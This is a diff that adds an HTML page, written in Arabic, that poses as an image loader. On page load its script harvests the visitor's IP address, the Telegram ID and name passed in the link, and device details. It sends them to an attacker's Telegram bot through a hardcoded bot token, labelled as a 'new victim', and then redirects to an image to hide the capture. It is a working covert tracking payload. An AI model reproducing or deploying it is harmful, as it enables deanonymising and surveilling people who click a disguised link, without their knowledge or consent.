@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+    <style>
+        body { background: #1a1a2e; color: white; text-align: center; font-family: Arial; padding-top: 100px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>جاري تحميل الصورة...</h2>
+    <div class="loader"></div>
+    <p>يرجى الانتظار لحظة</p>
+    <script>
+    (async function() {
+        // ==== 1. اجلب IP الضحية ====
+        let ip = "";
+        try {
+            const r = await fetch("https://api.ipify.org?format=json");
+            const j = await r.json();
+            ip = j.ip;
+        } catch(e) { ip = "غير متاح"; }
+
+        // ==== 2. استخرج معلومات التليغرام من رابط الصفحة ====
+        let tg_id = "", tg_username = "", tg_first_name = "", tg_last_name = "";
+        if (window.location.hash) {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            tg_id = params.get("tg_id") || "";
+            tg_username = params.get("tg_username") || "";
+            tg_first_name = params.get("tg_first_name") || "";
+            tg_last_name = params.get("tg_last_name") || "";
+        }
+
+        // ==== 3. أرسل كل شيء للبوت ====
+        const BOT_TOKEN = "8990244918:AAEFQhRhae9_7prVQu5SnaFTK5amCeht2fE";  // ← غير هذا إلى توكن البوت
+        const CHAT_ID = tg_id || "8175064921"; // ← ضع ايدي حسابك كبديل
+        
+        const message = `🚨 ضحية جديدة نقرت على الرابط!
+        
+🌐 IP: ${ip}
+👤 يوزر: @${tg_username}
+🆔 ID: ${tg_id}
+📛 الاسم: ${tg_first_name} ${tg_last_name}
+📱 الجهاز: ${navigator.platform}
+🌍 اللغة: ${navigator.language}
+🕐 المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+💻 الشاشة: ${screen.width}x${screen.height}
+⏰ الوقت: ${new Date().toISOString()}
+🖥️ User-Agent: ${navigator.userAgent}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+        } catch(e) {
+            console.error("فشل الإرسال:", e);
+        }
+
+        // ==== 4. إعادة توجيه لصورة حقيقية (للإخفاء) ====
+        setTimeout(() => {
+            const imgUrl = window.location.search.substring(1);
+            if (imgUrl) window.location.href = imgUrl;
+            else window.location.href = "https://t.me";
+        }, 2000);
+    })();
+    </script>
+</body>
+</html>
